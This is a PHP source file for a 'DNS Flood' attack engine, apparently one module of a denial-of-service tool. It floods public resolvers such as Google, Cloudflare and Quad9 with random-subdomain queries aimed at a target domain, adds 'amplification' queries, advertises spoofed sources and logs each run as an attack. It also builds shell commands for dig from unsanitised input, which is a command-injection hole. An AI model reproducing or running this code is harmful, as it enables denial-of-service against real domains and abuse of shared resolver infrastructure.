<?php

class DNSFloodEngine {
    private $config;
    private $isRunning = false;
    private $metrics = [];
    
    public function __construct($config = []) {
        $this->config = array_merge([
            'threads' => 1000,
            'duration' => 60,
            'dns_servers' => [
                '8.8.8.8', '8.8.4.4', '1.1.1.1', '1.0.0.1',
                '208.67.222.222', '208.67.220.220', '9.9.9.9'
            ],
            'query_types' => ['A', 'AAAA', 'MX', 'NS', 'TXT', 'CNAME'],
            'amplification_enabled' => true,
            'recursive_queries' => true,
            'spoofed_source' => true
        ], $config);
        
        $this->metrics = [
            'total_requests' => 0,
            'successful_queries' => 0,
            'failed_queries' => 0,
            'amplification_ratio' => 0,
            'threads_used' => $this->config['threads'],
            'error_codes' => [],
            'start_time' => time()
        ];
    }
    
    public function start($target, $groupId, $behaviorProfile) {
        $this->isRunning = true;
        $this->logMessage("Starting DNS Flood attack on $target with {$this->config['threads']} threads");
        
        $domain = $this->extractDomain($target);
        if (!$domain) {
            $this->logMessage("ERROR: Could not extract domain from $target");
            return $this->metrics;
        }
        
        $startTime = time();
        $endTime = $startTime + $this->config['duration'];
        
        $this->logMessage("DNS Flood targeting domain: $domain for {$this->config['duration']} seconds");
        
        while (time() < $endTime && $this->isRunning) {
            $this->executeFloodCycle($domain);
            usleep(100000); // 0.1 second between cycles
        }
        
        $this->isRunning = false;
        $this->logMessage("DNS Flood attack completed");
        return $this->metrics;
    }
    
    private function executeFloodCycle($domain) {
        $threadsPerCycle = min(100, $this->config['threads']);
        
        for ($i = 0; $i < $threadsPerCycle; $i++) {
            $this->sendDNSQuery($domain);
        }
    }
    
    private function sendDNSQuery($domain) {
        $dnsServer = $this->config['dns_servers'][array_rand($this->config['dns_servers'])];
        $queryType = $this->config['query_types'][array_rand($this->config['query_types'])];
        
        $subdomain = $this->generateRandomSubdomain() . '.' . $domain;
        
        $this->metrics['total_requests']++;
        
        try {
            if ($this->config['amplification_enabled']) {
                $result = $this->performAmplificationQuery($subdomain, $queryType, $dnsServer);
            } else {
                $result = $this->performStandardQuery($subdomain, $queryType, $dnsServer);
            }
            
            if ($result) {
                $this->metrics['successful_queries']++;
            } else {
                $this->metrics['failed_queries']++;
            }
            
        } catch (Exception $e) {
            $this->metrics['failed_queries']++;
            $this->metrics['error_codes']['dns_error'] = ($this->metrics['error_codes']['dns_error'] ?? 0) + 1;
        }
    }
    
    private function performAmplificationQuery($domain, $type, $server) {
        $amplificationDomains = [
            'isc.org', 'ripe.net', 'iana.org', 'icann.org'
        ];
        
        $amplificationDomain = $amplificationDomains[array_rand($amplificationDomains)];
        
        $command = "dig @$server $type $amplificationDomain +short 2>/dev/null";
        $output = shell_exec($command);
        
        $targetCommand = "dig @$server $type $domain +short 2>/dev/null";
        $targetOutput = shell_exec($targetCommand);
        
        $this->calculateAmplificationRatio($command, $output);
        
        return !empty($output) || !empty($targetOutput);
    }
    
    private function performStandardQuery($domain, $type, $server) {
        $command = "dig @$server $type $domain +short 2>/dev/null";
        $output = shell_exec($command);
        return !empty($output);
    }
    
    private function calculateAmplificationRatio($query, $response) {
        $querySize = strlen($query);
        $responseSize = strlen($response);
        
        if ($querySize > 0) {
            $ratio = $responseSize / $querySize;
            $this->metrics['amplification_ratio'] = max($this->metrics['amplification_ratio'], $ratio);
        }
    }
    
    private function generateRandomSubdomain() {
        $length = rand(8, 20);
        $chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
        $subdomain = '';
        
        for ($i = 0; $i < $length; $i++) {
            $subdomain .= $chars[rand(0, strlen($chars) - 1)];
        }
        
        return $subdomain;
    }
    
    private function extractDomain($url) {
        $parsed = parse_url($url);
        if (isset($parsed['host'])) {
            return $parsed['host'];
        }
        
        if (preg_match('/https?:\/\/([^\/]+)/', $url, $matches)) {
            return $matches[1];
        }
        
        return null;
    }
    
    public function stop() {
        $this->isRunning = false;
        $this->logMessage("DNS Flood attack stopped");
    }
    
    public function getMetrics() {
        return $this->metrics;
    }
    
    private function logMessage($message) {
        $logFile = './logs/backend.log';
        if (!is_dir(dirname($logFile))) {
            mkdir(dirname($logFile), 0755, true);
        }
        
        $timestamp = date('Y-m-d H:i:s');
        $logEntry = "[$timestamp] DNS_FLOOD_ENGINE: $message" . PHP_EOL;
        file_put_contents($logFile, $logEntry, FILE_APPEND | LOCK_EX);
    }
}

?>
